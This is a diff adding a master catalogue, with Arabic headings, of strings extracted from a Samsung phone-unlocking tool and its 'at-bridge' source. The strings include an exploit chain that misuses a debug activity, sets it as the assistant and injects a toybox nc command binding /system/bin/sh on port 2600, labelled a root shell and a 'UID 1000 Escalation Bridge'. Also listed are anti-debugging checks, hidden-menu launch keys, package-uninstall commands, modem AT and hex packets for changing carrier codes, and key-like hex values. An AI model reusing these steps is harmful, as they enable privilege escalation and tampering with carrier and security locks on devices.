@@ -1,0 +1,460 @@
+ALL_COMMANDS_MASTER — كل الأوامر/النصوص المستخرجة (AT + at-bridge + AT_unpacked)
+====================================================================================================
+
+### AT (HUNTER-UNLOCKER) — 123 نصاً (من 141 خام، بعد استبعاد الضجيج)
+[AT] GH:0x272a70 key=0x41 fn=FUN_00150730	/proc/self/status
+[AT] GH:0x272a88 key=0x41 fn=FUN_00150730	TracerPid:
+[AT] GH:0x272a98 key=0xc9 fn=FUN_0013840c	Model :
+[AT] GH:0x272aa3 key=0x56 fn=-	  CPU :
+[AT] GH:0x272ab3 key=0x6b fn=-	  Product Name  :
+[AT] GH:0x272aca key=0x6b fn=-	   Serial :
+[AT] GH:0x272ae3 key=0x49 fn=-	 Security patch :
+[AT] GH:0x272b00 key=0x5d fn=FUN_0013b87c,FUN_00150730	****************************************************
+[AT] GH:0x272b35 key=0x5d fn=-	******        HUNTER-UNLOCKER TOOL 2025       ******
+[AT] GH:0x272b6a key=0x5d fn=-	******                                        ******
+[AT] GH:0x272b9f key=0x5d fn=-	******           SAM RIL  V2.3 2025           ******
+[AT] GH:0x272c50 key=0x5d fn=FUN_00150730,FUN_00156f44,FUN_0015890c,FUN_00159e14,FUN_00204730	allocator<T>::allocate(size_t n) 'n' exceeds maximum supported size
+[AT] GH:0x2730d0 key=0xcb fn=FUN_00156f44,FUN_00159e84,FUN_0020a284,FUN_00212e50	ro.product.manufacturer
+[AT] GH:0x2730f1 key=0x87 fn=-	 [+] Product Manufacturer  : %s
+[AT] GH:0x273120 key=0x52 fn=FUN_00156f44,FUN_00159e84,FUN_0020a284,FUN_00212e50,FUN_0024e20c	ro.product.model
+[AT] GH:0x273141 key=0x84 fn=-	 [+] Product Model         : %s
+[AT] GH:0x273168 key=0x4e fn=FUN_00156f44,FUN_00161334,FUN_00204730,FUN_0020a284,FUN_00212e50	ro.serialno
+[AT] GH:0x273181 key=0x29 fn=-	 [+] Product Serial        : %s
+[AT] GH:0x2731b0 key=0xf6 fn=FUN_00156f44,FUN_0020a284,FUN_00212e50	ro.build.version.incremental
+[AT] GH:0x2731d1 key=0x3c fn=-	 [+] Build  Number         : %s
+[AT] GH:0x273200 key=0x3d fn=FUN_00156f44,FUN_0020a284,FUN_00212e50	ro.build.version.sdk
+[AT] GH:0x273221 key=0x1c fn=-	 [+] SDK Version           : %s
+[AT] GH:0x273248 key=0x28 fn=FUN_00154d68,FUN_00156f44	/proc/self/exe
+[AT] GH:0x273258 key=0x5e fn=FUN_00156f44	%s%s
+[AT] GH:0x2732f0 key=0x5e fn=FUN_0015890c	input keyevent 4 > /dev/null 2>&1
+[AT] GH:0x273320 key=0x38 fn=FUN_0015890c	ps -a 2>/dev/null|grep logcat 2>/dev/null
+[AT] GH:0x273350 key=0xa7 fn=FUN_0015890c	logcat
+[AT] GH:0x273358 key=0xb8 fn=FUN_0015890c	shell 
+[AT] GH:0x273360 key=0x9d fn=FUN_0015890c	kill pid 
+[AT] GH:0x273370 key=0x63 fn=FUN_0015890c	 2>/dev/null
+[AT] GH:0x273380 key=0x4c fn=FUN_0015890c	logcat -b system,main -c > /dev/null 2>&1
+[AT] GH:0x2733b0 key=0x7f fn=FUN_0015890c	logcat -b radio -c > /dev/null 2>&1
+[AT] GH:0x273430 key=0x47 fn=FUN_00158f88,FUN_00204730	UEsDBAoAAAgAAAAAITp9Yo4VYgYAAGIGAAAZAAUAcmVzL2RyYXdhYmxlL2ZkbV9sb2dvLnBuZ/7KAAAAiVBORw0KGgoAAAANSUhEUgAAAKcAAAA5CAQAAAD5... <Base64/blob — 224092 chars; extracted to EMBEDDED_APK>
+[AT] GH:0x2a9f90 key=0xa0 fn=FUN_001597e8,FUN_00204730	%d-%d-%d
+[AT] GH:0x2a9fa0 key=0x99 fn=FUN_00204730	Error: popen() failed!
+[AT] GH:0x2a9fc0 key=0x4e fn=FUN_00204730	Error: No log entry found.
+[AT] GH:0x2a9fe0 key=0x78 fn=FUN_0018a244,FUN_0018ac6c,FUN_0018af38,FUN_0018b1e8,FUN_0018b464	Error: Could not find [...] in log entry.
+[AT] GH:0x2aa010 key=0xfb fn=FUN_0015f304,FUN_0016b3c4,FUN_0016b604,FUN_0016bc88,FUN_001786e4	RIL Exit
+[AT] GH:0x2aa01c key=0x72 fn=FUN_0015f6ac,FUN_0018ada4,FUN_00204730,FUN_0020c104	120d
+[AT] GH:0x2aa030 key=0x18 fn=FUN_0016b3c4,FUN_0016b604,FUN_0016bc88,FUN_00185ff0,FUN_001888c8	[-] Failed to load library %s: %s
+[AT] GH:0x2aa058 key=0xed fn=FUN_0016b574,FUN_00185ff0,FUN_001878b0,FUN_00187f54,FUN_001888c8	send_recv_cmd
+[AT] GH:0x2aa070 key=0x64 fn=FUN_00185d3c,FUN_00204730,FUN_002094e4,FUN_0020abd0,FUN_0020df54	[-] Failed to find symbol 'send_recv_cmd' in %s: %s
+[AT] GH:0x2aa0b0 key=0xf8 fn=FUN_00204730,FUN_0020abd0,FUN_0020e7a4	[i] Found 'send_recv_cmd' in %s.
+[AT] GH:0x2aa0e0 key=0x1a fn=FUN_00204730,FUN_0020abd0	[-] Library %s did not return a valid response (code: %d, len: %d).
+[AT] GH:0x2aa140 key=0x48 fn=FUN_00204730	[-] Failed to extract a valid key from %s's response.
+[AT] GH:0x2aa181 key=0x89 fn=-	[SUCCESS] Challenge key (CALC) obtained from %s: %s
+[AT] GH:0x2aa1c0 key=0x6d fn=FUN_00204730	[SECURE] Encrypted CALC for use: %s
+[AT] GH:0x2aa1e8 key=0xef fn=FUN_00160450,FUN_00160a40,FUN_00204730,FUN_0020e07c,FUN_0020e7a4	ERORR
+[AT] GH:0x2aa1f0 key=0x1b fn=FUN_00161334,FUN_00204730,FUN_0020edd4,FUN_00212e50,FUN_0024e20c	B1EEBF38E789633D222F9040418EF4CBD5536B871BC8866AAEFE655E60C57295
+[AT] GH:0x2aa238 key=0x21 fn=FUN_00161334,FUN_00204730	52 i32 0 
+[AT] GH:0x2aa244 key=0x8d fn=FUN_00161334,FUN_00204730	131 
+[AT] GH:0x2aa24c key=0x1a fn=FUN_00161334,FUN_00204730	128 
+[AT] GH:0x2aa254 key=0xa fn=FUN_00161334,FUN_00204730,FUN_0020a284	132 
+[AT] GH:0x2aa25c key=0xc fn=FUN_00161334,FUN_00204730	136 
+[AT] GH:0x2aa264 key=0x4f fn=FUN_00161334,FUN_00204730	130 
+[AT] GH:0x2aa26c key=0x7d fn=FUN_00161334,FUN_00204730	135 
+[AT] GH:0x2aa282 key=0xb6 fn=-	ERORR: Connect , Try Again
+[AT] GH:0x2aa2b0 key=0xdd fn=FUN_00161334,FUN_00204730	XgvkwKl8K6T8eAGsvyE2ydmLgBOpjk0F
+[AT] GH:0x2aa2d4 key=0xaf fn=FUN_00161334,FUN_00204730	SETSPR
+[AT] GH:0x2aa2dc key=0x60 fn=FUN_00161334,FUN_00204730	setspr
+[AT] GH:0x2aa2e8 key=0x90 fn=FUN_00161334,FUN_00204730	5119010532
+[AT] GH:0x2aa2f8 key=0x32 fn=FUN_00161334	01426X1
+[AT] GH:0x2aa300 key=0x4f fn=FUN_00161334	01426x1
+[AT] GH:0x2aa308 key=0xa6 fn=FUN_00161334,FUN_00204730	echo 
+[AT] GH:0x2aa310 key=0x4e fn=FUN_00161334,FUN_00204730	 | /system/bin/toybox nc 127.0.0.1 2600 > /dev/null 2>&1
+[AT] GH:0x2aa350 key=0x44 fn=FUN_00161334	SRELOCK
+[AT] GH:0x2aa358 key=0x5e fn=FUN_00161334	srelock
+[AT] GH:0x2aa372 key=0xd2 fn=-	 Remove KG Done 
+[AT] GH:0x2aa390 key=0x7f fn=FUN_00161334,FUN_00204730	echo "am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1 
+[AT] GH:0x2aa3fa key=0xa4 fn=-	ERROR: %s
+[AT] GH:0x2aa404 key=0xa1 fn=FUN_00161334,FUN_00204730	pclose
+[AT] GH:0x2aa412 key=0x94 fn=-	  Open Done 
+[AT] GH:0x2aa424 key=0x2d fn=FUN_00161334,FUN_00204730	AT+
+[AT] GH:0x2aa428 key=0x2e fn=FUN_00161334,FUN_00204730	GETSPR
+[AT] GH:0x2aa430 key=0x7 fn=FUN_00161334,FUN_00204730	51180004
+[AT] GH:0x2aa43c key=0x40 fn=FUN_00161334,FUN_00204730	EXIT
+[AT] GH:0x2aa448 key=0x50 fn=FUN_00161334,FUN_00204730	000000000000
+[AT] GH:0x2aa472 key=0xf4 fn=-	OK:%s
+[AT] GH:0x2aa482 key=0xe4 fn=-	 [*] RIL Error ex1 [*] 
+[AT] GH:0x2aa4a2 key=0xa8 fn=-	  [+] Ril Error 1 
+[AT] GH:0x2aa4b8 key=0x15 fn=FUN_00174704,FUN_00204730	pm path 
+[AT] GH:0x2aa4c8 key=0xf1 fn=FUN_00174704,FUN_00175498,FUN_00204730	package:
+[AT] GH:0x2aa4e0 key=0x76 fn=FUN_0016d718,FUN_00204730	com.samsung.rms.retailagent.global
+[AT] GH:0x2aa510 key=0xd fn=FUN_0016d718,FUN_00204730	com.sdet.fotaagent
+[AT] GH:0x2aa530 key=0xd8 fn=FUN_00175498,FUN_00204730	pm list packages | grep com.skatd.unlock
+[AT] GH:0x2aa560 key=0x25 fn=FUN_00174fd4,FUN_00175498,FUN_00204730	 > /dev/null 2>&1
+[AT] GH:0x2aa578 key=0xfc fn=FUN_00175498,FUN_00204730	am force-stop 
+[AT] GH:0x2aa590 key=0x3f fn=FUN_00177d90,FUN_00204730	<node[^>]*text="EXECUTE"[^>]*bounds="\[([0-9]+),([0-9]+)\]\[([0-9]+),([0-9]+)\]"[^>]*>
+[AT] GH:0x2aa5e8 key=0x13 fn=FUN_00177d90,FUN_00178bc4,FUN_00204730	input tap 
+[AT] GH:0x2aa600 key=0x4a fn=FUN_00178bc4,FUN_00204730	<node[^>]*resource-id="android:id/aerr_wait"[^>]*bounds="\[([0-9]+),([0-9]+)\]\[([0-9]+),([0-9]+)\]"
+[AT] GH:0x2aa670 key=0x41 fn=FUN_0016efc4,FUN_001790d8,FUN_00204730	com.sec.android.app.audiocoredebug
+[AT] GH:0x2aa6a0 key=0x13 fn=FUN_001790d8,FUN_00204730	input keyevent 3 > /dev/null 2>&1
+[AT] GH:0x2aa6d0 key=0x24 fn=FUN_001790d8,FUN_00204730	settings put system screen_off_timeout 600000 > /dev/null 2>&1
+[AT] GH:0x2aa710 key=0x66 fn=FUN_001790d8,FUN_00204730	settings put system assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
+[AT] GH:0x2aa7a0 key=0xe6 fn=FUN_001790d8,FUN_00204730	settings put Secure assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
+[AT] GH:0x2aa830 key=0x9a fn=FUN_001790d8,FUN_00204730	settings put global function_key_config_doublepress_value com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
+[AT] GH:0x2aa8e0 key=0x22 fn=FUN_001790d8,FUN_00204730	pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1
+[AT] GH:0x2aa920 key=0xcf fn=FUN_001790d8,FUN_00182684,FUN_00204730	input keyevent 219 > /dev/null 2>&1
+[AT] GH:0x2aa950 key=0xd5 fn=FUN_001790d8,FUN_00204730	rm -rf /sdcard/window_dump.xml > /dev/null 2>&1
+[AT] GH:0x2aa980 key=0x18 fn=FUN_001790d8,FUN_00182684,FUN_00204730	uiautomator dump /sdcard/window_dump.xml > /dev/null 2>&1
+[AT] GH:0x2aa9c0 key=0xd4 fn=FUN_001790d8,FUN_00182684,FUN_00204730	cat /sdcard/window_dump.xml
+[AT] GH:0x2aa9e0 key=0xed fn=FUN_001790d8,FUN_00182684,FUN_00204730	input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'
+[AT] GH:0x2aaa20 key=0x1a fn=FUN_001790d8	EXECUTE
+[AT] GH:0x2aaa30 key=0x2b fn=FUN_001790d8,FUN_00204730	input keyevent 61 > /dev/null 2>&1
+[AT] GH:0x2aaa60 key=0x89 fn=FUN_001790d8,FUN_00182684,FUN_00204730	input keyevent 66 > /dev/null 2>&1
+[AT] GH:0x2aaa90 key=0x20 fn=FUN_00182684,FUN_00204730	pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1
+[AT] GH:0x2aaad8 key=0x75 fn=FUN_00182684,FUN_00204730	aerr_wait
+[AT] GH:0x2aaaf0 key=0x91 fn=FUN_00182684,FUN_00204730	am start -a android.settings.SETTINGS > /dev/null 2>&1
+[AT] GH:0x2aab30 key=0xc3 fn=FUN_0016efc4,FUN_00204730	cmd wifi set-wifi-enabled disabled > /dev/null 2>&1
+[AT] GH:0x2aab70 key=0xc1 fn=FUN_0016efc4,FUN_00204730	input keyevent 82 > /dev/null 2>&1
+[AT] GH:0x2aaba0 key=0x46 fn=FUN_0016efc4,FUN_00204730	com.samsung.android.FactoryTestLauncher
+[AT] GH:0x2aac50 key=0x1a fn=FUN_0017510c,FUN_00204730	thread constructor failed
+[AT] GH:0x2ac030 key=0x19 fn=FUN_002088f0,FUN_0020a130,FUN_0020abd0,FUN_0021395c,FUN_0021420c	Worng Ril Command
+[AT] GH:0x2ac130 key=0x32 fn=FUN_0020a284,FUN_00212e50,FUN_0021420c,FUN_0024e20c	ro.build.version.release
+[AT] GH:0x2ac150 key=0xfe fn=FUN_0020a284,FUN_00212e50	ro.build.version.security_patch
+[AT] GH:0x2ac1b0 key=0x19 fn=FUN_0020a284,FUN_00212e50	ro.boot.debug_level
+[AT] GH:0x2ac1d0 key=0x17 fn=FUN_0020a284,FUN_00212e50	ro.boot.cp_debug_level
+[AT] GH:0x2ac1f2 key=0x5b fn=FUN_0021b034,FUN_0021ba10	Ril Token Error, Try Again
+[AT] GH:0x2ac210 key=0x22 fn=FUN_00212e50	%02X
+[AT] GH:0x2ac274 key=0xdd fn=FUN_0020a284,FUN_0020dc7c,FUN_00212e50,FUN_00225a40,FUN_0022a9d0	%02x
+[AT] GH:0x2ac690 key=0x48 fn=FUN_00227cf0	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+[AT] GH:0x2ac6e0 key=0x6b fn=FUN_00227cf0	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_
+[AT] GH:0x2ac730 key=0x80 fn=FUN_00227360,FUN_00227cf0	Input is not valid base64-encoded data.
+
+### at-bridge (كود المصدر C)
+[AT-BRIDGE define CMD_FLUSH_RADIO_LOGS]	logcat -b radio -c > /dev/null 2>&1
+[AT-BRIDGE define CMD_SET_SCREEN_TIMEOUT]	settings put system screen_off_timeout 600000 > /dev/null 2>&1
+[AT-BRIDGE define CMD_SET_ASSISTANT_SECURE]	settings put Secure assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
+[AT-BRIDGE define CMD_SET_ASSISTANT_SYSTEM]	settings put system assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
+[AT-BRIDGE define CMD_SET_DOUBLEPRESS_GLOBAL]	settings put global function_key_config_doublepress_value com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
+[AT-BRIDGE define CMD_LAUNCH_SETTINGS]	am start -a android.settings.SETTINGS > /dev/null 2>&1
+[AT-BRIDGE define CMD_TRIGGER_ASSIST_KEY]	input keyevent 219 > /dev/null 2>&1
+[AT-BRIDGE define CMD_INJECT_NC_ROOT_SHELL]	input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'
+[AT-BRIDGE define CMD_KEYEVENT_ENTER]	input keyevent 66 > /dev/null 2>&1
+[AT-BRIDGE define CMD_KEYEVENT_TAB]	input keyevent 61 > /dev/null 2>&1
+[AT-BRIDGE define CMD_KEYEVENT_HOME]	input keyevent 3 > /dev/null 2>&1
+[AT-BRIDGE define CMD_KEYEVENT_MENU]	input keyevent 82 > /dev/null 2>&1
+[AT-BRIDGE define CMD_LAUNCH_SAMSUNG_HIDDEN_MENU]	am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1
+[AT-BRIDGE define CMD_CHECK_SKT_UNLOCK]	pm list packages | grep com.skatd.unlock
+[AT-BRIDGE define CMD_CLEAR_FACTORY_TEST]	pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1
+[AT-BRIDGE define CMD_CLEAR_AUDIO_DEBUG]	pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1
+[AT-BRIDGE define CMD_DUMP_UI_HIERARCHY]	uiautomator dump /sdcard/window_dump.xml > /dev/null 2>&1
+[AT-BRIDGE define CMD_CAT_UI_HIERARCHY]	cat /sdcard/window_dump.xml
+[AT-BRIDGE define CMD_CLEAN_UI_DUMP]	rm -rf /sdcard/window_dump.xml > /dev/null 2>&1
+[AT-BRIDGE define AT_CMD_TEST]	AT\r\n
+[AT-BRIDGE define AT_CMD_PRECONFG_READ]	AT+PRECONFG=1,0\r\n
+[AT-BRIDGE define AT_CMD_PRECONFG_WRITE_FMT]	AT+PRECONFG=2,%s\r\n
+[AT-BRIDGE define AT_CMD_REBOOT_RADIO]	AT+CFUN=1,1\r\n
+[AT-BRIDGE define AT_CMD_MODEM_FACTORY_RESET]	AT+FACTORST=0,0\r\n
+[AT-BRIDGE define AT_CMD_DEVCONINFO]	AT+DEVCONINFO\r\n
+[AT-BRIDGE define AT_CMD_KSTRINGB]	AT+KSTRINGB=0,3\r\n
+[AT-BRIDGE define AT_CMD_IMEI_QUERY]	+IMEITEST:1,\r\n
+[AT-BRIDGE define AT_CMD_SIM_STATUS]	AT+CPIN?\r\n
+[AT-BRIDGE define AT_CMD_QUERY_NETWORK_LOCK]	AT+CLCK=\"PN\",2\r\n
+[AT-BRIDGE define AT_CMD_QUERY_SUBSET_LOCK]	AT+CLCK=\"PU\",2\r\n
+[AT-BRIDGE define AT_CMD_QUERY_SP_LOCK]	AT+CLCK=\"PP\",2\r\n
+[AT-BRIDGE define AT_CMD_QUERY_CORP_LOCK]	AT+CLCK=\"PC\",2\r\n
+[AT-BRIDGE define AT_CMD_QUERY_SIM_LOCK]	AT+CLCK=\"SC\",2\r\n
+[AT-BRIDGE define PKG_AUDIO_DEBUG]	com.sec.android.app.audiocoredebug
+[AT-BRIDGE define ACT_AUDIO_DEBUG_SHELL]	com.sec.android.app.audiocoredebug.AudioAdbShellActivity
+[AT-BRIDGE define PKG_HIDDEN_MENU]	com.sec.hiddenmenu
+[AT-BRIDGE define ACT_IOT_HIDDEN_MENU]	com.sec.hiddenmenu.IOTHiddenMenu
+[AT-BRIDGE define PKG_FACTORY_TEST]	com.samsung.android.FactoryTestLauncher
+[AT-BRIDGE define PKG_RETAIL_MODE]	com.samsung.rms.retailagent.global
+[AT-BRIDGE define PKG_SKT_UNLOCK]	com.skatd.unlock
+[AT-BRIDGE define PKG_FOTA_AGENT]	com.sdet.fotaagent
+[AT-BRIDGE define PROTO_PREFIX_CSC]	CSC:
+[AT-BRIDGE define PROTO_PREFIX_AT]	AT:
+[AT-BRIDGE define PROTO_PREFIX_HEX]	HEX:
+[AT-BRIDGE define PROTO_CMD_SCAN]	SCAN
+[AT-BRIDGE define PROTO_CMD_STATUS]	STATUS
+[AT-BRIDGE define PROTO_CMD_LOCKS]	LOCKS
+[AT-BRIDGE define PROTO_CMD_RECONNECT]	RECONNECT
+[AT-BRIDGE define PROTO_CMD_HELP]	HELP
+[AT-BRIDGE define PROTO_CMD_EXIT]	EXIT
+[AT-BRIDGE define PROTO_CMD_QUIT]	QUIT
+[AT-BRIDGE define TELEMETRY_FORMAT_STRING]	INFO|MODEL=%s|CSC=%s|AND=%s|PATCH=%s|DBG=%s|UID=%d|CH=%s\n
+[AT-BRIDGE src]	[+] UID 1000 Escalation Bridge confirmed on port %d\n
+[AT-BRIDGE src]	/dev/umts_ipc0
+[AT-BRIDGE src]	/dev/umts_ipc1
+[AT-BRIDGE src]	/dev/umts_rfs0
+[AT-BRIDGE src]	/dev/diag
+[AT-BRIDGE src]	/dev/umts_atc0
+[AT-BRIDGE src]	/dev/umts_atc1
+[AT-BRIDGE src]	/dev/umts_at0
+[AT-BRIDGE src]	/dev/at_distributor
+[AT-BRIDGE src]	/dev/at_distributor0
+[AT-BRIDGE src]	/dev/smd11
+[AT-BRIDGE src]	/dev/smd0
+[AT-BRIDGE src]	/dev/smd7
+[AT-BRIDGE src]	/dev/ttyGS0
+[AT-BRIDGE src]	/dev/ttyACM0
+[AT-BRIDGE src]	/dev/ttyUSB0
+[AT-BRIDGE src]	/dev/socket/rild
+[AT-BRIDGE src]	/dev/socket/rild-oem
+[AT-BRIDGE src]	/dev/socket/rild-debug
+[AT-BRIDGE src]	/dev/socket/rild2
+[AT-BRIDGE src]	/dev/socket/qmux_radio/qmux_client_socket0
+[AT-BRIDGE src]	/dev/socket/
+[AT-BRIDGE src]	[+] %s: Found (TTY AT - %s)\n
+[AT-BRIDGE src]	Read/Write OK
+[AT-BRIDGE src]	[+] %s: Found (Direct IPC - %s)\n
+[AT-BRIDGE src]	[%c] %s: Found (%s)\n
+[AT-BRIDGE src]	%s\r\n
+[AT-BRIDGE src]	AT+CPIN?
+[AT-BRIDGE src]	AT+CLCK=\"PN\",2
+[AT-BRIDGE src]	AT+CLCK=\"PU\",2
+[AT-BRIDGE src]	AT+CLCK=\"PP\",2
+[AT-BRIDGE src]	AT+CLCK=\"PC\",2
+[AT-BRIDGE src]	ERROR
+[AT-BRIDGE src]	MODEM_ERROR
+[AT-BRIDGE src]	+CLCK: 0
+[AT-BRIDGE src]	+CLCK:0
+[AT-BRIDGE src]	+CLCK: 1
+[AT-BRIDGE src]	+CLCK:1
+[AT-BRIDGE src]	  SIM State (CPIN)             : %s\n
+[AT-BRIDGE src]	  Network Lock (CLCK:PN)       : %s\n
+[AT-BRIDGE src]	  Network Subset Lock (CLCK:PU): %s\n
+[AT-BRIDGE src]	  Service Provider Lock (PP)   : %s\n
+[AT-BRIDGE src]	  Corporate Lock (CLCK:PC)     : %s\n
+[AT-BRIDGE src]	SIMLOCK|CPIN=%s|PN=%s|PU=%s|PP=%s|PC=%s\n
+[AT-BRIDGE src]	[ERROR] Invalid CSC code: %s (must be 2-5 uppercase chars)\n
+[AT-BRIDGE src]	.ERR_CSC_INVALID..\n
+[AT-BRIDGE src]	[*] Starting Samsung CSC change to: %s (Hex: %s)\n
+[AT-BRIDGE src]	0601000E0000%s0000%s
+[AT-BRIDGE src]	  [1/5] Injecting: %s\n
+[AT-BRIDGE src]	060100090000%s
+[AT-BRIDGE src]	  [2/5] Injecting: %s\n
+[AT-BRIDGE src]	060100120000%s0000%s%s
+[AT-BRIDGE src]	  [3/5] Injecting: %s\n
+[AT-BRIDGE src]	  [4/5] Injecting: %s\n
+[AT-BRIDGE src]	  [5/5] Injecting: %s\n
+[AT-BRIDGE src]	[*] CSC change sequence completed for: %s\n
+[AT-BRIDGE src]	pm uninstall -k --user 0 com.sec.android.AutoPreconfig 2>/dev/null
+[AT-BRIDGE src]	pm uninstall -k --user 0 com.sec.omadmspr 2>/dev/null
+[AT-BRIDGE src]	logcat -b radio -c 2>/dev/null
+[AT-BRIDGE src]	[+] Samsung CSC change successful.\n
+[AT-BRIDGE src]	.OK_CSC..\n
+[AT-BRIDGE src]	INFO|MODEL=%s|CSC=%s|AND=%s|PATCH=%s|DBG=%s|UID=%d|CH=%s\n
+[AT-BRIDGE src]	  Product Brand  : %s\n
+[AT-BRIDGE src]	  Product Model  : %s\n
+[AT-BRIDGE src]	  Serial Number  : %s\n
+[AT-BRIDGE src]	  Device Carrier : %s\n
+[AT-BRIDGE src]	  Android Version: %s\n
+[AT-BRIDGE src]	  Security Patch : %s\n
+[AT-BRIDGE src]	  Debug Level    : %s\n
+[AT-BRIDGE src]	  Process UID    : %d\n
+[AT-BRIDGE src]	  Active Channel : %s (%s)\n
+[AT-BRIDGE src]	Usage: %s [OPTIONS]\n\n
+[AT-BRIDGE src]	One-Shot CLI Options:\n
+[AT-BRIDGE src]	  -c <CSC>       Quick Samsung CSC change (e.g. -c XAA)\n
+[AT-BRIDGE src]	  -a <AT_CMD>    Send single AT command and exit (e.g. -a AT+DEVCONINFO)\n
+[AT-BRIDGE src]	  -s             Scan mode: list accessible modem & RIL devices\n
+[AT-BRIDGE src]	  -d <DEVICE>    Force specific modem device path (e.g. -d /dev/umts_atc0)\n
+[AT-BRIDGE src]	  -p <PORT>      Escalation port (default: 2600)\n
+[AT-BRIDGE src]	Interactive Commands (run without options):\n
+[AT-BRIDGE src]	  CSC:<CODE>     Automated 5-packet Samsung CSC change\n
+[AT-BRIDGE src]	  AT:<CMD>       Send raw AT command (e.g. AT:AT+DEVCONINFO)\n
+[AT-BRIDGE src]	  HEX:<DATA>     Send hex IPC command (or raw hex without prefix)\n
+[AT-BRIDGE src]	  SCAN           Scan and report accessible modem channels\n
+[AT-BRIDGE src]	  STATUS         Display full device, channel and SIM lock status\n
+[AT-BRIDGE src]	  LOCKS          Query SIM & Network lock status (CPIN, CLCK)\n
+[AT-BRIDGE src]	  RECONNECT      Re-probe and reconnect best modem channel\n
+[AT-BRIDGE src]	  MODE:AT        Switch to AT text channel (/dev/umts_atc0)\n
+[AT-BRIDGE src]	  MODE:IPC       Switch to IPC / RIL socket channel (/dev/socket/rild)\n
+[AT-BRIDGE src]	  AUTH:<SEED>    Activate dynamic Xorshift32 stream cipher\n
+[AT-BRIDGE src]	  HELP           Show this interactive help\n
+[AT-BRIDGE src]	  EXIT, QUIT     Terminate bridge session\n
+[AT-BRIDGE src]	%s\n
+[AT-BRIDGE src]	.ERR_AT_TIMEOUT..\n
+[AT-BRIDGE src]	.ERR_IPC..\n
+[AT-BRIDGE src]	.ERR_HEX_SYNTAX..\n
+[AT-BRIDGE src]	EXIT
+[AT-BRIDGE src]	QUIT
+[AT-BRIDGE src]	HELP
+[AT-BRIDGE src]	SCAN
+[AT-BRIDGE src]	STATUS
+[AT-BRIDGE src]	LOCKS
+[AT-BRIDGE src]	RECONNECT
+[AT-BRIDGE src]	.CH=%s..\n<< 
+[AT-BRIDGE src]	AUTH:
+[AT-BRIDGE src]	.OK_AUTH..\n<< 
+[AT-BRIDGE src]	CSC:
+[AT-BRIDGE src]	MODE:AT
+[AT-BRIDGE src]	MODE:IPC
+[AT-BRIDGE src]	AT:
+[AT-BRIDGE src]	HEX:
+[AT-BRIDGE src]	.OK..%s#\n
+[AT-BRIDGE src]	.OK..#\n
+[AT-BRIDGE src]	.ERR_SYNTAX..\n
+
+### AT_unpacked.elf
+[AT-UNPACKED 0x0127ca]	socket
+[AT-UNPACKED 0x03d385]	unsupported restore location for float register
+[AT-UNPACKED 0x03d5fe]	Error: %s
+[AT-UNPACKED 0x03d6b1]	unsupported arm64 register
+[AT-UNPACKED 0x03e3be]	Ril Token Error, Try Again
+[AT-UNPACKED 0x03e683]	Wrong AuthKey Error
+[AT-UNPACKED 0x03e79b]	allocator<T>::allocate(size_t n) 'n' exceeds maximum supported size
+[AT-UNPACKED 0x03e88d]	DW_EH_PE_aligned pointer encoding not supported
+[AT-UNPACKED 0x03e9b9]	April
+[AT-UNPACKED 0x03ea42]	unsupported restore location for register
+[AT-UNPACKED 0x03ea79]	EXIT
+[AT-UNPACKED 0x03ecde]	 [+] Authantication Token : %s
+[AT-UNPACKED 0x03ee44]	DW_EH_PE_funcrel pointer encoding not supported
+[AT-UNPACKED 0x03ee74]	libunwind: Unsupported .eh_frame_hdr version
+[AT-UNPACKED 0x03ef67]	RIL Exit
+[AT-UNPACKED 0x03f0ef]	 > /dev/null 2>&1
+[AT-UNPACKED 0x03f101]	Worng Ril Command
+[AT-UNPACKED 0x03f260]	  [+] Ril Error 1 
+[AT-UNPACKED 0x03f56d]	unsupported locale for standard input
+[AT-UNPACKED 0x03f720]	echo "am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1 
+[AT-UNPACKED 0x03f788]	 [+] Enter Authantication Key : 
+[AT-UNPACKED 0x03f837]	UEsDBAoAAAgAAAAAITp9Yo4VYgYAAGIGAAAZAAUAcmVzL2RyYXdhYmxlL2ZkbV9sb2dvLnBuZ/7KAAAAiVBORw0KGgoAAAANSUhEUgAAAKcAAAA5CAQAAAD5... <Base64/blob — 224092 chars>
+[AT-UNPACKED 0x076396]	  [+] Ril Error 2 
+[AT-UNPACKED 0x076618]	DW_EH_PE_textrel pointer encoding not supported
+[AT-UNPACKED 0x0769d3]	locale not supported
+[AT-UNPACKED 0x076df0]	,main -c > /dev/h
+[AT-UNPACKED 0x077140]	ps -a 2>/dev/nul\&
+[AT-UNPACKED 0x077210]	ro.product.modell|grep logcat 2>G
+[AT-UNPACKED 0x0775d0]	-c > /dev/null 2
+[AT-UNPACKED 0x0776f0]	logcat -b systemlogcat -b radio 
+[AT-UNPACKED 0x077aa8]	/dev/nul
+
+
+### MCC & MNC — أوامر وخصائص وحزم
+# المصادر: AT (Ghidra/raw) + at-bridge + سجلات L24 + Q-Unlocker + KEY-Tool.DMP + Octoplus MCC_MNC_LIST
+# الوسوم: [AT-BIN] داخل AT | [AT-BRIDGE] مصدر at-bridge | [AT-OBS] مرصود | [PROP] خاصية أندرويد | [ADB-OBS] مرصود | [STD] معياري غير مرصود | [TOOL] نص أداة | [PAYLOAD] حزمة | [DB] قاعدة بيانات
+
